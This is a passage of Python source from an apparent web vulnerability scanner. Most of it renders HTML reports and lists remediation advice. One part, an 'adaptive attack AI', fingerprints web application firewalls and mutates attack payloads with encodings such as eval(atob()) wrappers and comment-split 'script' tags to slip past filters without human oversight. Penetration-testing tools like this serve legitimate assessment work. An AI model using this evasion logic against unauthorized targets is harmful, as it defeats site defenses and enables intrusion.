            "@@VULN_TYPE_OPTIONS@@":   vuln_type_options,
            "@@LEAK_CAT_OPTIONS@@":    leak_cat_options,
            "@@VULN_ROWS@@":           vuln_rows,
            "@@CRIT_ROWS@@":           crit_rows,
            "@@URL_ROWS@@":            url_rows,
            "@@LEAK_ROWS@@":           leak_rows,
            "@@SUBDOMAIN_ROWS@@":      sub_rows,
            "@@PORT_ROWS@@":           port_rows,
            "@@DNS_ROWS@@":            dns_rows,
            "@@DNS_ISSUES@@":          dns_issues,
            "@@SSL_SECTION@@":         ssl_section,
            "@@OSINT_SECTION@@":       osint_section,
            "@@REMEDIATION_SECTION@@": remediation_section,
            "@@TECH_ROWS@@":           tech_rows,
            "@@GRAPH_NODES@@":         graph_nodes_js,
            "@@GRAPH_EDGES@@":         graph_edges_js,
            "@@VULNS_JSON@@":          vulns_json,
            "@@URLS_JSON@@":           urls_json,
            "@@LEAKS_JSON@@":          leaks_json,
            "@@SUBS_JSON@@":           subs_json,
            "@@PORTS_JSON@@":          ports_json,
            "@@TECH_CHART_DATA@@":     tech_chart_data,
        }
        for k, v in repl.items():
            html = html.replace(k, v)
        return html

    # ── Row renderers ─────────────────────────────────
    def _vuln_row(self, v: VulnResult, idx: int = 0) -> str:
        e  = html_lib.escape
        sc = {"critical":"br","high":"bo","medium":"by","low":"bc","info":"bd"}
        cc = {"confirmed":"bg","likely":"by","possible":"bc"}
        cvss_html = (
            f'<span style="font-family:\'Share Tech Mono\',monospace;font-size:.62rem;color:'
            + ('#ff3366' if (v.cvss or 0)>=9 else '#ff6633' if (v.cvss or 0)>=7 else '#ffaa00' if (v.cvss or 0)>=4 else '#6e7488')
            + f'">{ "%.1f"%v.cvss if v.cvss else "—" }</span>'
        )
        cve_html = (
            f'<a href="https://nvd.nist.gov/vuln/detail/{e(v.cve)}" target="_blank" class="badge cve-link">{e(v.cve)}</a>'
            if v.cve else '<span style="color:var(--t3)">—</span>'
        )
        return (
            f'<tr class="xrow">'
            f'<td><span class="badge {sc.get(v.severity.lower(),"bd")}">{e(v.severity.upper())}</span></td>'
            f'<td style="font-family:\'Share Tech Mono\',monospace;font-size:.62rem;color:var(--t1)">{e(v.vuln_type)}</td>'
            f'<td><span class="badge {cc.get(v.confidence,"bc")}">{e(v.confidence)}</span></td>'
            f'<td>{cve_html}</td>'
            f'<td>{cvss_html}</td>'
            f'<td style="max-width:260px;word-break:break-all;font-size:.65rem;color:var(--cyan)"'
            f'    title="{e(v.url)}">{e(v.url[:80])}{"…" if len(v.url)>80 else ""}</td>'
            f'<td style="font-size:.65rem">{e(v.parameter[:40] if v.parameter else "—")}</td>'
            f'<td><button class="xbtn" style="padding:.15rem .5rem;font-size:.52rem"'
            f'    onclick="event.stopPropagation();showVulnModal({idx})">&#128269;</button></td>'
            f'</tr>'
        )

    def _url_row(self, c: CrawlResult) -> str:
        e  = html_lib.escape
        sc = {200:"bg",201:"bg",301:"bc",302:"bc",304:"bc",400:"by",401:"by",403:"by",404:"bp",500:"br",502:"br",503:"br"}
        st = str(c.status_code)
        ct = (c.content_type or "").split(";")[0].strip()[:40]
        ct_color = "#00d2ff" if "html" in ct else "#00ff88" if "json" in ct else "#b060ff" if "javascript" in ct else "#6e7488"
        return (
            f'<tr class="xrow">'
            f'<td style="max-width:340px;word-break:break-all;font-family:\'DM Mono\',monospace;font-size:.65rem;color:var(--cyan)">{e(c.url[:120])}{"…" if len(c.url)>120 else ""}</td>'
            f'<td><span class="badge {sc.get(c.status_code,"bc")}">{st}</span></td>'
            f'<td style="font-family:\'Share Tech Mono\',monospace;font-size:.65rem">{self._human_size(c.size)}</td>'
            f'<td style="max-width:200px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;font-size:.68rem" title="{e(c.title)}">{e(c.title[:70])}</td>'
            f'<td style="text-align:center">{len(c.forms) if c.forms else 0}</td>'
            f'<td style="font-family:\'DM Mono\',monospace;font-size:.6rem;color:{ct_color}">{e(ct or "—")}</td>'
            f'</tr>'
        )

    def _leak_row(self, f: Finding) -> str:
        e    = html_lib.escape
        sc   = {"critical":"br","high":"br","medium":"by","low":"bc","info":"bd"}
        val  = f.value[:55] + ("…" if len(f.value) > 55 else "")
        key  = f.key[:40] if f.key else "—"
        return (
            f'<tr class="xrow">'
            f'<td><span class="badge bc">{e(f.category)}</span></td>'
            f'<td><span class="badge {sc.get(f.severity.lower(),"bd")}">{e(f.severity.upper())}</span></td>'
            f'<td style="font-family:\'Share Tech Mono\',monospace;font-size:.63rem;color:#ffaa00;max-width:200px;word-break:break-all" title="{e(f.value)}">{e(val)}</td>'
            f'<td style="font-family:\'DM Mono\',monospace;font-size:.63rem;color:var(--t2)">{e(key)}</td>'
            f'<td style="max-width:220px;font-size:.63rem;word-break:break-all" title="{e(f.source_url)}">{e(f.source_url[:70])}{"…" if len(f.source_url)>70 else ""}</td>'
            f'<td style="max-width:180px;font-size:.62rem;color:var(--t3);word-break:break-all">{e(f.context[:80])}</td>'
            f'</tr>'
        )

    def _sub_row(self, s: SubdomainResult) -> str:
        e    = html_lib.escape
        ips  = ", ".join(s.ip_addresses[:4])
        cnames = ", ".join(s.cnames[:3]) if s.cnames else "—"
        techs = " ".join(
            f'<span class="badge bd" style="font-size:.5rem">{e(t[:18])}</span>'
            for t in (s.technologies or [])[:3]
        )
        alive_badge = '<span class="badge bg">ALIVE</span>' if s.alive else '<span class="badge bd">DEAD</span>'
        sc_badge = ""
        if s.status_code:
            sc_map = {200:"bg", 301:"bc", 302:"bc", 403:"by", 404:"bp", 500:"br"}
            cls = sc_map.get(s.status_code, "bc")
            sc_badge = f'<span class="badge {cls}">{s.status_code}</span>'
        return (
            f'<tr class="xrow">'
            f'<td style="font-family:\'Share Tech Mono\',monospace;color:var(--cyan);font-size:.68rem">{e(s.subdomain)}</td>'
            f'<td style="font-family:\'DM Mono\',monospace;font-size:.65rem">{e(ips) or "—"}</td>'
            f'<td>{sc_badge}</td>'
            f'<td>{alive_badge}</td>'
            f'<td style="font-size:.62rem">{techs or "—"}</td>'
            f'<td style="font-family:\'DM Mono\',monospace;font-size:.62rem;color:var(--t3)">{e(cnames)}</td>'
            f'<td style="font-size:.6rem;color:var(--t3)">{e(s.source)}</td>'
            f'</tr>'
        )

    def _port_row(self, p: PortResult) -> str:
        e  = html_lib.escape
        is_risky = p.port in self.RISKY_PORTS and p.state == "open"
        state_cls = "br" if is_risky else "bg" if p.state == "open" else "bc" if p.state == "filtered" else "bd"
        risk_html = (
            '<span class="badge br" style="font-size:.5rem">HIGH RISK</span>'
            if is_risky else
            '<span class="badge bd" style="font-size:.5rem">normal</span>'
            if p.state == "open" else ''
        )
        return (
            f'<tr class="xrow" data-risky="{"1" if is_risky else "0"}">'
            f'<td style="font-family:\'Share Tech Mono\',monospace;color:var(--cyan);font-size:.72rem">{p.port}</td>'
            f'<td><span class="badge {state_cls}">{e(p.state.upper())}</span></td>'
            f'<td style="font-family:\'Share Tech Mono\',monospace;font-size:.65rem">{e(p.service or "—")}</td>'
            f'<td style="font-family:\'DM Mono\',monospace;font-size:.63rem;color:var(--t2)">{e(p.version[:60] if p.version else "—")}</td>'
            f'<td style="font-size:.62rem;color:var(--t3);max-width:300px;word-break:break-all">{e(p.banner[:120] if p.banner else "—")}</td>'
            f'<td>{risk_html}</td>'
            f'</tr>'
        )

    def _dns_row(self, d: DNSRecord) -> str:
        e  = html_lib.escape
        tc = {"A":"bg","AAAA":"bc","MX":"by","NS":"bc","TXT":"bp",
              "CNAME":"bc","SOA":"bp","AXFR":"br","PTR":"bc"}
        return (
            f'<tr class="xrow">'
            f'<td><span class="badge {tc.get(d.record_type,"bc")}">{e(d.record_type)}</span></td>'
            f'<td style="font-family:\'DM Mono\',monospace">{e(d.name)}</td>'
            f'<td style="word-break:break-all;font-size:.68rem">{e(d.value[:160])}</td>'
            f'<td>{d.ttl}</td>'
            f'</tr>'
        )

    def _tech_row(self, t: TechResult) -> str:
        e = html_lib.escape
        return (
            f'<tr class="xrow">'
            f'<td style="color:var(--cyan);font-family:\'DM Mono\',monospace">{e(t.name)}</td>'
            f'<td>{e(t.version or "–")}</td>'
            f'<td><div class="score-bar-track" style="width:100px"><div class="score-bar-fill" data-pct="{t.confidence}" style="width:{t.confidence}%"></div></div></td>'
            f'<td>{e(t.category or "–")}</td>'
            f'</tr>'
        )

    def _crit_row(self, v: "VulnResult", idx: int = 0) -> str:
        """Compact row for the overview critical/high quick-list."""
        e  = html_lib.escape
        sc = {"critical": "br", "high": "bo", "medium": "by", "low": "bc", "info": "bd"}
        cve_html = (
            f'<a href="https://nvd.nist.gov/vuln/detail/{e(v.cve)}" target="_blank" '
            f'class="badge cve-link">{e(v.cve)}</a>'
            if v.cve else "—"
        )
        cvss = f"{v.cvss:.1f}" if v.cvss else "—"
        cvss_color = ("#ff3366" if (v.cvss or 0) >= 9 else
                      "#ff6633" if (v.cvss or 0) >= 7 else "#ffaa00")
        return (
            f'<tr class="xrow" onclick="switchTab(\'vulns\')">'
            f'<td><span class="badge {sc.get(v.severity.lower(), "bd")}">'
            f'{e(v.severity.upper())}</span></td>'
            f'<td style="font-family:\'Share Tech Mono\',monospace;font-size:.62rem">{e(v.vuln_type)}</td>'
            f'<td>{cve_html}</td>'
            f'<td style="font-family:\'Share Tech Mono\',monospace;color:{cvss_color};font-size:.65rem">{cvss}</td>'
            f'<td style="font-size:.63rem;word-break:break-all;max-width:260px;color:var(--cyan)"'
            f'    title="{e(v.url)}">{e(v.url[:80])}{"..." if len(v.url) > 80 else ""}</td>'
            f'<td style="font-size:.63rem">{e(v.parameter[:35] if v.parameter else "—")}</td>'
            f'</tr>'
        )

    # ── REMEDIATION SECTION ───────────────────────────────────────────────
    _REM_DB: dict = {
        "XSS":    ["Output-encode all user data in the correct context (HTML / JS / CSS / URL).",
                   "Implement Content-Security-Policy with script nonce or hash allowlisting.",
                   "Set HttpOnly, Secure, and SameSite=Strict on all session cookies.",
                   "Use framework auto-escaping (React JSX, Angular interpolation, Jinja2 autoescape).",
                   "Validate input character-set and length on the server before any rendering."],
        "SQLI":   ["Use parameterised queries or prepared statements exclusively.",
                   "Apply principle of least-privilege to all database service accounts.",
                   "Disable verbose database error messages from reaching HTTP responses.",
                   "Add WAF rules blocking SQL injection patterns as defence-in-depth.",
                   "Audit all ORM raw-query escapes and custom SQL string builders."],
        "SSRF":   ["Whitelist allowed destination IP ranges, hostnames, and ports via egress proxy.",
                   "Block cloud metadata endpoints (169.254.169.254, fd00:ec2::254) at network layer.",
                   "Disable automatic URL redirects on all internal HTTP clients.",
                   "Canonicalise and validate all user-supplied URLs before any outbound fetch.",
                   "Reject private RFC-1918 and loopback addresses in URL inputs."],
        "XXE":    ["Disable external-entity and DTD processing in every XML parser instance.",
                   "Prefer JSON over XML wherever the API contract allows.",
                   "Configure parsers with FEATURE_SECURE_PROCESSING flag when XML is required.",
                   "Validate incoming XML against a strict schema before processing."],
        "LFI":    ["Validate all file-path inputs against a hard-coded allowlist of safe paths.",
                   "Use realpath() and assert the result starts with the allowed base directory.",
                   "Never pass unsanitised user input to open(), include(), or require().",
                   "Run file-reading services inside a chroot jail or container."],
        "RCE":    ["Urgently isolate affected systems from the network.",
                   "Patch or remove the vulnerable component immediately.",
                   "Eliminate all shell=True subprocess calls; pass argument arrays instead.",
                   "Enable Mandatory Access Control (SELinux / AppArmor) to limit blast radius.",
                   "Implement code-integrity monitoring with AIDE or Tripwire post-remediation."],
        "IDOR":   ["Implement server-side authorisation checks for every resource access request.",
                   "Replace sequential database IDs with cryptographically random UUIDs.",
                   "Log all authorisation failures and alert on anomalous access patterns.",
                   "Never trust client-supplied object identifiers without re-verifying ownership."],
        "JWT":    ["Reject tokens using the 'none' algorithm or missing an 'alg' claim.",
                   "Use asymmetric signing (RS256 / ES256); never expose the private key.",
                   "Validate iss, aud, exp, and nbf claims on every incoming request.",
                   "Rotate signing keys regularly and maintain a token revocation list."],
        "SSTI":   ["Never render user-controlled data through a template engine at runtime.",
                   "Use sandbox modes or restricted execution contexts where templating is required.",
                   "Whitelist allowed template variables; block access to __builtins__ and globals."],
        "OPEN":   ["Validate redirect targets against a strict allowlist of safe internal paths.",
                   "Reject absolute URLs supplied in redirect or 'next' parameters.",
                   "Use relative paths for all internal redirects and log every redirect event."],
        "default":["Apply vendor security patch or upgrade to the latest supported version.",
                   "Add WAF rule to block known exploit patterns for this vulnerability class.",
                   "Review application logic for similar patterns across all equivalent endpoints.",
                   "Schedule a follow-up penetration test after remediation is complete."],
    }
    _REF_DB: dict = {
        "XSS":   ["https://owasp.org/www-community/attacks/xss/",
                  "https://portswigger.net/web-security/cross-site-scripting",
                  "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"],
        "SQLI":  ["https://owasp.org/www-community/attacks/SQL_Injection",
                  "https://portswigger.net/web-security/sql-injection"],
        "SSRF":  ["https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
                  "https://portswigger.net/web-security/ssrf"],
        "XXE":   ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                  "https://portswigger.net/web-security/xxe"],
        "RCE":   ["https://owasp.org/www-project-top-ten/",
                  "https://portswigger.net/web-security/os-command-injection"],
        "default":["https://owasp.org/www-project-top-ten/",
                   "https://nvd.nist.gov/",
                   "https://portswigger.net/web-security"],
    }

    def _get_rem_steps(self, vuln_type: str) -> list:
        key = next((k for k in self._REM_DB if k != "default"
                    and k in vuln_type.upper()), "default")
        return self._REM_DB[key]

    def _get_refs(self, vuln_type: str, cve: "Optional[str]" = None) -> list:
        key = next((k for k in self._REF_DB if k != "default"
                    and k in vuln_type.upper()), "default")
        refs = list(self._REF_DB[key])
        if cve:
            refs.insert(0, f"https://nvd.nist.gov/vuln/detail/{cve}")
        return refs

    def _render_remediation(self, r: "ScanResults") -> str:
        """Build the full remediation tab: prioritised accordion per vuln type."""
        e = html_lib.escape
        if not r.vulns:
            return (
                '<div class="panel"><div class="phdr"><div class="ptitle">Remediation</div></div>'
                '<p style="font-family:\'DM Mono\',monospace;font-size:.78rem;color:var(--t3);padding:.5rem">'
                'No vulnerabilities found — no remediation required.</p></div>'
            )

        sev_ord = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        groups: dict = {}
        for v in r.vulns:
            groups.setdefault(v.vuln_type, []).append(v)
        sorted_groups = sorted(
            groups.items(),
            key=lambda kv: min(sev_ord.get(v.severity.lower(), 9) for v in kv[1])
        )

        sev_cls   = {"critical": "br", "high": "bo", "medium": "by", "low": "bc", "info": "bd"}
        sev_pri   = {"critical": "#ff3366", "high": "#ff6633", "medium": "#ffaa00",
                     "low": "#00d2ff", "info": "#3a3e52"}
        sev_label = {"critical": "CRITICAL — Remediate Immediately",
                     "high":     "HIGH — Remediate This Sprint",
                     "medium":   "MEDIUM — Remediate This Quarter",
                     "low":      "LOW — Track and Schedule",
                     "info":     "INFO — Review Only"}

        blocks = []
        for vuln_type, vulns in sorted_groups:
            worst = min(sev_ord.get(v.severity.lower(), 9) for v in vulns)
            worst_name = ["critical", "high", "medium", "low", "info"][min(worst, 4)]
            steps  = self._get_rem_steps(vuln_type)
            refs   = self._get_refs(vuln_type, next((v.cve for v in vulns if v.cve), None))
            step_li  = "".join(f"<li>{e(s)}</li>" for s in steps)
            ref_links = "".join(
                f'<div>&#8594; <a href="{e(ref)}" target="_blank">{e(ref)}</a></div>'
                for ref in refs
            )
            affected = sorted(set(v.url for v in vulns))[:5]
            affected_html = "".join(
                f'<div style="font-family:\'DM Mono\',monospace;font-size:.62rem;color:var(--cyan);'
                f'word-break:break-all;padding:.18rem 0">{e(u[:100])}{"..." if len(u) > 100 else ""}</div>'
                for u in affected
            )
            color = sev_pri.get(worst_name, "#6e7488")
            more_txt = (
                f'<div style="font-family:\'DM Mono\',monospace;font-size:.6rem;color:var(--t3)">'
                f'... and {len(vulns) - 5} more instances</div>'
                if len(vulns) > 5 else ""
            )
            blocks.append(
                f'<div class="rem-group">'
                f'<div class="rem-hdr">'
                f'<span class="badge {sev_cls.get(worst_name, "bd")}">{worst_name.upper()}</span>'
                f'<span style="font-family:\'Share Tech Mono\',monospace;font-size:.7rem;'
                f'color:var(--t0);margin-left:.35rem">{e(vuln_type)}</span>'
                f'<span style="font-family:\'DM Mono\',monospace;font-size:.6rem;'
                f'color:var(--t3);margin-left:.6rem">{len(vulns)} instance{"s" if len(vulns)!=1 else ""}</span>'
                f'<span style="font-family:\'DM Mono\',monospace;font-size:.6rem;'
                f'color:{color};margin-left:auto;margin-right:.6rem">'
                f'{e(sev_label.get(worst_name, ""))}</span>'
                f'<span class="rem-arrow">&#9658;</span>'
                f'</div>'
                f'<div class="rem-body">'
                f'<div style="margin-bottom:.85rem">'
                f'<div class="msec-title" style="margin-top:.5rem">Affected URLs ({len(vulns)} total)</div>'
                f'{affected_html}{more_txt}'
                f'</div>'
                f'<div class="msec-title">Remediation Steps</div>'
                f'<ol class="rem-steps">{step_li}</ol>'
                f'<div class="rem-refs" style="margin-top:.75rem">'
                f'<div style="font-family:\'Share Tech Mono\',monospace;font-size:.52rem;'
                f'letter-spacing:.15em;text-transform:uppercase;color:var(--t3);margin-bottom:.4rem">References</div>'
                f'{ref_links}'
                f'</div></div></div>'
            )

        total_crit = sum(1 for v in r.vulns if v.severity.lower() == "critical")
        total_high = sum(1 for v in r.vulns if v.severity.lower() == "high")
        summary = (
            f'<div style="font-family:\'DM Mono\',monospace;font-size:.75rem;color:var(--t1);'
            f'line-height:1.85;background:var(--deep);padding:1.1rem;'
            f'border-radius:var(--r);border:1px solid var(--b1);margin-bottom:1.1rem">'
            f'Assessment identified <strong style="color:var(--red)">{len(r.vulns)} vulnerabilities</strong> '
            f'across <strong style="color:var(--cyan)">{len(groups)} distinct classes</strong>. '
            f'<strong style="color:var(--red)">{total_crit}</strong> critical and '
            f'<strong style="color:#ff6633">{total_high}</strong> high-severity findings '
            f'require immediate attention. Items below are sorted by severity.'
            f'</div>'
        )
        return (
            '<div class="panel">'
            '<div class="phdr"><div class="ptitle">Prioritised Remediation Plan</div></div>'
            + summary
            + "\n".join(blocks)
            + '</div>'
        )

    def _render_scores(self, ml: Dict[str, float]) -> str:
        if not ml:
            return ""
        overall = ml.get("overall", 0)
        pct     = int(overall * 10)
        rows_html = ""
        for key in ["vulnerabilities", "data_exposure", "network", "ssl_tls"]:
            val = ml.get(key, 0)
            p   = int(val * 10)
            rows_html += (
                f'<div class="score-item">'
                f'<div class="score-label">{key.replace("_"," ").title()}</div>'
                f'<div class="score-val">{val:.1f}<span style="font-size:1rem;color:var(--t3)">/10</span></div>'
                f'<div class="score-bar-track"><div class="score-bar-fill" data-pct="{p}" style="width:{p}%"></div></div>'
                f'</div>'
            )
        return (
            f'<div class="score-section">'
            f'<div class="panel-title" style="border:none;margin-bottom:.25rem">// ML Risk Scores</div>'
            f'<div style="display:flex;align-items:center;gap:1rem;margin-bottom:.5rem">'
            f'<span style="font-family:\'Share Tech Mono\',monospace;font-size:2.5rem;color:var(--cyan)">{overall:.1f}</span>'
            f'<span style="color:var(--t3);font-family:\'DM Mono\',monospace;font-size:.8rem">/10 overall risk</span>'
            f'</div>'
            f'<div class="score-row">{rows_html}</div>'
            f'</div>'
        )

    def _render_ssl(self, r: "ScanResults") -> str:
        e  = html_lib.escape
        if not r.ssl:
            return '<div class="panel"><div class="panel-title">SSL/TLS Analysis</div><p style="color:var(--t3);font-family:\'DM Mono\',monospace;font-size:.78rem">No SSL/TLS analysis performed or target is HTTP only.</p></div>'
        s  = r.ssl
        rows = [
            ("Host",            f"{s.host}:{s.port}"),
            ("Subject CN",      s.subject.get("commonName","–")),
            ("Issuer",          s.issuer.get("organizationName","–")),
            ("Not Before",      s.not_before),
            ("Not After",       s.not_after),
            ("Days Remaining",  str(s.days_remaining)),
            ("TLS Version",     s.tls_version),
            ("Cipher Suite",    s.cipher_suite),
            ("Key Type / Bits", f"{s.key_type} / {s.key_bits}"),
            ("Signature Algo",  s.signature_algo),
            ("Self Signed",     "YES ⚠️" if s.is_self_signed else "No"),
            ("Expired",         "YES ⚠️" if s.is_expired   else "No"),
            ("HSTS",            "Present" if s.hsts_present else "Missing"),
        ]
        kv_html = "".join(
            f'<div class="kv-row"><div class="kv-key">{e(k)}</div><div class="kv-val">{e(v)}</div></div>'
            for k, v in rows
        )
        san_pills = "".join(
            f'<span class="badge bc" style="margin:.15rem">{e(san)}</span>'
            for san in s.san[:30]
        )
        vuln_list = "".join(
            f'<div style="color:#ff3366;font-family:\'DM Mono\',monospace;font-size:.72rem;padding:.25rem 0">⚡ {e(v)}</div>'
            for v in s.vulnerabilities
        )
        return (
            f'<div class="panel">'
            f'<div class="panel-title">SSL/TLS Certificate Analysis</div>'
            f'<div class="sub-grid">'
            f'<div><div class="sub-title">Certificate Details</div>{kv_html}</div>'
            f'<div>'
            f'<div class="sub-title">Subject Alternative Names</div>'
            f'<div class="pill-list" style="margin-bottom:1.5rem">{san_pills}</div>'
            f'<div class="sub-title">Vulnerabilities / Issues</div>'
            f'{vuln_list or self._NONE_SSL_HTML}'
            f'</div></div></div>'
        )

    def _render_dns_issues(self, r: "ScanResults") -> str:
        dns_mod = DNSModule(self.config)
        issues  = dns_mod.analyze_spf_dmarc(r.dns)
        if not issues:
            return ""
        e     = html_lib.escape
        items = "".join(
            f'<div style="color:#ffaa00;font-family:\'DM Mono\',monospace;font-size:.72rem;padding:.25rem 0">⚠ {e(i)}</div>'
            for i in issues
        )
        return (
            f'<div class="panel" style="margin-top:1rem;border-color:rgba(255,170,0,.18)">'
            f'<div class="panel-title" style="color:var(--amber)">// Email Security Issues</div>'
            f'{items}'
            f'</div>'
        )

    def _render_osint(self, r: "ScanResults") -> str:
        e    = html_lib.escape
        osint = r.osint
        if not osint:
            return '<div class="panel"><div class="panel-title">OSINT Results</div><p style="color:var(--t3);font-family:\'DM Mono\',monospace;font-size:.78rem">No OSINT API keys provided. Pass --shodan, --vt, --censys-id/secret, --greynoise, --hunter, or --securitytrails to enable.</p></div>'

        sections = []
        for key in ["shodan","censys","virustotal","greynoise","hunter","securitytrails","whois"]:
            data = osint.get(key) or r.whois if key == "whois" else osint.get(key)
            if not data:
                continue
            pretty = json.dumps(data, indent=2, default=str)
            sections.append(
                f'<div class="panel" style="margin-bottom:1rem">'
                f'<div class="panel-title">{e(key.upper())}</div>'
                f'<pre style="max-height:18rem">{e(pretty)}</pre>'
                f'</div>'
            )

        # Hunter emails
        hunter = osint.get("hunter", {})
        emails = hunter.get("emails", [])
        if emails:
            pills = "".join(f'<span class="badge bc" style="margin:.15rem">{e(em)}</span>' for em in emails[:50])
            sections.append(
                f'<div class="panel"><div class="panel-title">HUNTER.IO — Discovered Emails</div>'
                f'<div class="pill-list">{pills}</div></div>'
            )

        return "\n".join(sections) if sections else (
            '<div class="panel"><div class="panel-title">OSINT Results</div>'
            '<p style="color:var(--t3);font-family:\'DM Mono\',monospace;font-size:.78rem">No OSINT data available.</p></div>'
        )

    @staticmethod
    def _human_size(n: int) -> str:
        for unit in ("B","KB","MB","GB"):
            if n < 1024: return f"{n:.0f} {unit}"
            n /= 1024
        return f"{n:.1f} TB"

# ════════════════════════════════════════════════════════
# DISTRIBUTED WORKER (basic multi-target queue)
# ════════════════════════════════════════════════════════

class DistributedCoordinator:
    """
    Simple multi-target coordinator.
    Each worker picks a target from the queue and runs a full scan.
    Aggregates results into combined JSON.
    """

    def __init__(self, targets: List[str], config: ScanConfig):
        self.targets = targets
        self.config  = config
        self.results: List[ScanResults] = []
        self._lock   = asyncio.Lock()

    async def run(self) -> List[ScanResults]:
        q = asyncio.Queue()
        for t in self.targets:
            await q.put(t)

        async def worker():
            while not q.empty():
                try:
                    target = q.get_nowait()
                except asyncio.QueueEmpty:
                    break
                cfg = copy.copy(self.config)
                cfg.target = target
                cfg.output_dir = None
                cfg.__post_init__()
                aegis = AEGIS(cfg)
                res   = await aegis.run()
                async with self._lock:
                    self.results.append(res)
                q.task_done()

        workers = [asyncio.create_task(worker())
                   for _ in range(min(len(self.targets), 5))]
        await asyncio.gather(*workers, return_exceptions=True)
        return self.results


# ════════════════════════════════════════════════════════
# AEGIS — MAIN ORCHESTRATOR
# ════════════════════════════════════════════════════════





class DefenseProfile:
    """Tracks detected defense layers for a target."""
    def __init__(self):
        self.waf_name          = None
        self.rate_limited      = False
        self.blocked_agents    = set()
        self.blocked_payloads  = set()
        self.allowed_encodings = ["raw", "url", "double_url", "html",
                                  "unicode", "hex", "case_swap", "comment",
                                  "null_byte", "base64"]
        self.adaptive_delay    = 0.0
        self.block_count       = 0
        self.success_count     = 0
        self.mutation_history  = []


class AdaptiveEngine:
    """
    Real-time adaptive attack AI. Fingerprints WAF/IDS mid-scan,
    mutates payloads via epsilon-greedy online RL, and auto-adjusts
    timing to bypass active defenses without human intervention.
    """

    WAF_SIGNATURES = {
        "Cloudflare":  ["cf-ray", "cloudflare", "__cfduid", "cf_clearance"],
        "Akamai":      ["akamai", "ak_bmsc", "bm_sz", "x-akamai"],
        "AWS WAF":     ["x-amzn-requestid", "x-amz-cf-id", "awselb"],
        "Sucuri":      ["x-sucuri-id", "sucuri-clientsupport"],
        "Imperva":     ["x-iinfo", "incap_ses", "visid_incap", "_incapsula"],
        "F5 BIG-IP":   ["bigipserver", "f5_cspm", "ts=", "x-wa-info"],
        "ModSecurity": ["mod_security", "modsecurity", "naxsi_sig"],
        "Barracuda":   ["barra_counter_session", "bn_u"],
        "Fortinet":    ["fortigate", "forticlient"],
        "Fastly":      ["fastly-restarts", "x-served-by"],
        "Reblaze":     ["x-reblaze-protection"],
    }

    BLOCK_BODY_PATTERNS = [
        r"access denied", r"blocked", r"forbidden", r"security violation",
        r"attack detected", r"firewall", r"captcha", r"unusual activity",
        r"intrusion detected", r"malicious", r"threat detected",
    ]

    def __init__(self, config):
        self.config  = config
        self.profile = DefenseProfile()
        self._lock   = asyncio.Lock()
        self._reward_table = {}
        self._epsilon      = 0.30
        self._encoders     = self._build_encoders()

    def _build_encoders(self):
        def url_enc(p):
            return urllib.parse.quote(p, safe="")
        def double_url(p):
            return urllib.parse.quote(urllib.parse.quote(p, safe=""), safe="")
        def html_ent(p):
            return "".join("&#{};".format(ord(c)) if c in "<>\"'&" else c for c in p)
        def uni_esc(p):
            return "".join(
                "\\u{:04x}".format(ord(c)) if ord(c) > 127 or c in "<>\"'" else c
                for c in p
            )
        def hex_enc(p):
            return "".join("%" + format(ord(c), "02x") for c in p)
        def case_swap(p):
            return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p))
        def comment_ins(p):
            if "script" in p.lower():
                return re.sub(r'(?i)script', 'scr/**/ipt', p)
            if "select" in p.lower():
                return p.replace(" ", "/**/")
            return p
        def null_byte(p):
            return p + "%00"
        def b64_wrap(p):
            enc = base64.b64encode(p.encode()).decode()
            return "eval(atob('{}'))".format(enc)
        return {
            "raw":        lambda p: p,
            "url":        url_enc,
            "double_url": double_url,
            "html":       html_ent,
            "unicode":    uni_esc,
            "hex":        hex_enc,
            "case_swap":  case_swap,
            "comment":    comment_ins,
            "null_byte":  null_byte,
            "base64":     b64_wrap,
        }

    async def fingerprint_response(self, status, headers, body):
        async with self._lock:
            if self.profile.waf_name is None:
                h_str = json.dumps({k.lower(): v.lower() for k, v in headers.items()})
                b_str = (body or "")[:2000].lower()
                for waf, sigs in self.WAF_SIGNATURES.items():
                    if any(s in h_str or s in b_str for s in sigs):
                        self.profile.waf_name = waf
                        cprint("[bold yellow]  WAF detected:[/bold yellow] " + waf)
                        break
            if status == 429 or "retry-after" in {k.lower() for k in headers}:
                self.profile.rate_limited = True
                ra = headers.get("Retry-After", headers.get("retry-after", "5"))
                try:
                    delay = float(ra) + 1.0
                except (ValueError, TypeError):
                    delay = 5.0
                self.profile.adaptive_delay = max(self.profile.adaptive_delay, delay)
                cprint("[yellow]  Rate-limit → delay {:.1f}s[/yellow]".format(
                    self.profile.adaptive_delay))
            if status in (403, 406, 429, 503):
                self.profile.block_count += 1
                b_low = (body or "")[:1000].lower()
                if any(re.search(p, b_low) for p in self.BLOCK_BODY_PATTERNS):
                    self.profile.adaptive_delay = min(
                        self.profile.adaptive_delay + 0.5, 10.0)
            else:
                self.profile.success_count += 1

    def mutate_payload(self, payload, attack_type):
        available = [e for e in self._encoders
                     if e in self.profile.allowed_encodings]
        if not available:
            available = list(self._encoders.keys())
        if random.random() < self._epsilon:
            chosen = random.choice(available)
        else:
            scored = {e: self._reward_table.get((e, attack_type), 0.5) for e in available}
            chosen = max(scored, key=scored.__getitem__)
        mutated = self._encoders[chosen](payload)
        self.profile.mutation_history.append({
            "encoder": chosen, "attack": attack_type, "original": payload[:40]
        })
        return mutated

    def record_outcome(self, encoder, attack_type, success):
        key     = (encoder, attack_type)
        current = self._reward_table.get(key, 0.5)
        self._reward_table[key] = 0.7 * current + 0.3 * (1.0 if success else 0.0)
        self._epsilon = max(0.05, self._epsilon * 0.995)

    async def adaptive_sleep(self):
        if self.profile.adaptive_delay > 0:
            await asyncio.sleep(self.profile.adaptive_delay)

    def get_summary(self):
        return {
            "waf":          self.profile.waf_name,
            "rate_limited": self.profile.rate_limited,
            "delay_s":      self.profile.adaptive_delay,
            "blocks":       self.profile.block_count,
            "successes":    self.profile.success_count,
            "epsilon":      round(self._epsilon, 3),
            "top_encoders": sorted(
                self._reward_table.items(), key=lambda x: x[1], reverse=True
            )[:5],
        }


class AdvancedAttackModule:
    """
    Phase 11 — Novel & Cutting-Edge Attack Techniques.

    HTTP Request Smuggling · Cache Poisoning · GraphQL Injection
    JWT alg:none · Race Conditions · Prototype Pollution
